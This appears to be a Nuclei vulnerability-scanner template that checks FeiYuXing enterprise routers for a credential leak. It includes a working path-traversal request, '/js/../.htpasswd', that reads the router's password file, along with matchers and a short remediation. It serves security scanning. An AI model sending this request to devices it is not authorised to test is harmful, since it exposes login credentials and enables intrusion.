id: FeiYuXing-Ent-Router-InfoLeak

info:
  name: FeiYuXing Ent Router InfoLeak
  author: adeljck
  severity: high
  description: |
    This template checks for FeiYuXing Ent Router InfoLeak Vuln,Which Can Get Router's Credentials.

  remediation: |
    Update the frimware to the latest version.
    If your device is out of service.add path /js/../.htpasswd to your WAF.

http:
  - method: GET
    path:
      - "{{BaseURL}}/js/../.htpasswd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "text/plain"
      - type: word
        part: body
        words:
          - "$"
          - ":"